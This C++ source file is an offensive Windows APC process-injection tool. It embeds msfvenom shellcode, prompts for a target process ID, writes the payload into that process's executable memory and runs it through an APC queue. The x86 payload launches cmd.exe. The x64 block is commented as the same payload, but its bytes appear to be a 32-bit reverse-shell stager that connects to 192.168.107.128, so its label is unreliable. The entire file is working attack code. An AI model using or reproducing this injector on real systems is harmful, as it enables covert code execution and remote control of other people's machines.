#include <iostream>
#include <Basic_func.h>
#include <APC_INJECTION.h>

#ifdef _X86_
//msfvenom -a x86 --platform windows -p windows/exec CMD="cmd.exe" EXITFUNC=thread -f c
unsigned char shellcode[] =
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x68\xa6\x95\xbd\x9d\xff\xd5"
"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
"\x00\x53\xff\xd5\x63\x6d\x64\x2e\x65\x78\x65\x00";

#endif

#ifdef _WIN64
//msfvenom -a x64 --platform windows -p windows/x64/exec CMD="cmd.exe" EXITFUNC=thread -f c
unsigned char shellcode[] =
"\xFC\xE8\x8F\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B"
"\x52\x0C\x8B\x52\x14\x0F\xB7\x4A\x26\x8B\x72\x28\x31\xFF\x31\xC0"
"\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x48\x01\xC7\x49\x75\xEF\x52"
"\x57\x8B\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4C"
"\x01\xD0\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\x85\xC9\x74\x3C\x31"
"\xFF\x49\x8B\x34\x8B\x01\xD6\x31\xC0\xC1\xCF\x48\xAC\x01\xC7\x38"
"\xE0\x75\xF4\x03\x7D\xF8\x3B\x7D\x24\x75\xE0\x58\x8B\x58\x24\x01"
"\xD3\x66\x8B\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89"
"\x44\x24\x24\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12"
"\xE9\x80\xFF\xFF\xFF\x5D\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F"
"\x54\x68\xFB\xEB\x3E\xA7\x89\xE8\xFF\xD0\xB8\x90\x01\x00\x00\x29"
"\xC4\x54\x50\x68\xB5\x3B\x42\x5B\xFF\xD5\x6A\x0A\x68\xC0\xA8\x6B"
"\x80\x68\x02\x00\x11\x62\x89\xE6\x50\x50\x50\x50\x40\x50\x40\x50"
"\x68\xAD\x2C\x3C\x2E\x83\xc5\x01\x83\xc5\xff\xFF\xD5\x97\x6A\x10\x56\x57\x68\x6F\x3C\xD4"
"\x18\xFF\xD5\x85\xC0\x74\x0A\xFF\x4E\x08\x75\xEC\xE8\x67\x00\x00"
"\x00\x6A\x00\x6A\x04\x56\x57\x68\x73\xD9\x64\xAC\xFF\xD5\x83\xF8"
"\x00\x7E\x36\x8B\x36\x6A\x40\x68\x00\x10\x00\x00\x56\x6A\x00\x68"
"\x39\xD8\x4F\xA8\xFF\xD5\x93\x53\x6A\x00\x56\x53\x57\x68\x73\xD9"
"\x64\xAC\xFF\xD5\x83\xF8\x00\x7D\x28\x58\x68\x00\x40\x00\x00\x6A"
"\x00\x50\x68\xBC\xDE\x31\xD3\xFF\xD5\x57\x68\xD8\xA7\x46\x89\xFF"
"\xD5\x5E\x5E\xFF\x0C\x24\x0F\x85\x70\xFF\xFF\xFF\xE9\x9B\xFF\xFF"
"\xFF\x01\xC3\x29\xC6\x75\xC1\xC3\xBB\xD9\x9B\x5F\xDB\x6A\x00\x53"
"\xFF\xD5";
#endif


int wmain(int argc, wchar_t** argv)
{
    DWORD PID = 0;

    std::cout << "LEVIATHAN APC INJECTION" << std::endl;
    std::cout << "PROCESS_PID \t PROCESSNAME" << std::endl;
    showProcess();

    std::cout << "PLEASE INPUT PROCESSPID WHICH YOU WANNA INJECT" << std::endl;
    std::cin >> PID;
    
    std::cout << "[+] YOUR PID IS: "<< PID << std::endl;

    // Open process with ALL_ACCESS
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    if (hProcess == NULL) {
        ExitShowError(TEXT("OpenProcess"));
    }

    std::cout << "[+] Your hProcess is: " << hProcess << std::endl;

    // Allocate memory to inject malicious code in the target process
    LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (lpBaseAddress == NULL) {
        ExitShowError(TEXT("VirtualAllocEx"));
    }

    BOOL writeFlag = WriteProcessMemory(hProcess, lpBaseAddress, shellcode, sizeof(shellcode), 0);

    if (!writeFlag) {
        ExitShowError(TEXT("WriteProcessMemory"));
    }

    std::cout << "[+] Shellcode is written to memory of target process" << std::endl;

    InjectAPCbyPID(PID, lpBaseAddress);

    CloseHandle(hProcess);
    system("PAUSE");
    return 0;
}

